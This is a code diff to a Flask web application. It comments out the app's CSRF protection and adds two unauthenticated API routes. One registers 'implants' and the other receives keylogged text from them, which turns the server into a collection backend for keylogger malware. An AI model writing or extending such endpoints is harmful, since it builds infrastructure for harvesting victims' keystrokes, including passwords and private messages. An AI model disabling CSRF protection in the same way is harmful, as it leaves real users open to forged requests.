@@ -35,7 +35,7 @@ login_manager.init_app(app)
 login_manager.session_protection = "strong"
 
 # Enable CSRF protection
-csrf = CSRFProtect(app)
+# csrf = CSRFProtect(app)
 
 # Dummy user database (replace with a real database in production)
 users = [
@@ -138,6 +138,16 @@ def logout():
     logout_user()  # Clear the session
     return jsonify({"logout": True})
 
+@app.route("/api/new/implant", methods=["GET"])
+def new_implant():
+    return jsonify(db.new_implant())
+    
+@app.route("/api/new/keylog", methods=["POST"])
+def new_keylog():
+    data = request.json
+    text = data.get("text")
+    implantid = int(data.get("implantid"))
+    return jsonify(db.new_keylog(text, implantid))
 
 if __name__ == "__main__":
     app.run(debug=True)
